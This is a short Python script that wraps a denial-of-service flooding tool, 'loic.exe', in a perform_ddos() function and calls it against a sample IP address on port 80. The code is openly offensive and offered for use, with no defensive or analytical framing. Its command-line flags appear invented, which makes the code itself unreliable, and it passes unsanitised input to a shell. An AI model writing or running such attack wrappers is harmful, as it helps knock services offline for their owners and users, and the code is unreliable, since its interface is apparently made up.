import subprocess
def perform_ddos(target_ip, duration, port, num_packets):
command = f"loic.exe -t {target_ip} -d {duration} -p {port} -s {num_packets}"
subprocess.run(command, shell=True)
# Usage example
target_ip = "192.168.1.1"
duration = 60
port = 80
num_packets = 1000

perform_ddos(target_ip, duration, port, num_packets)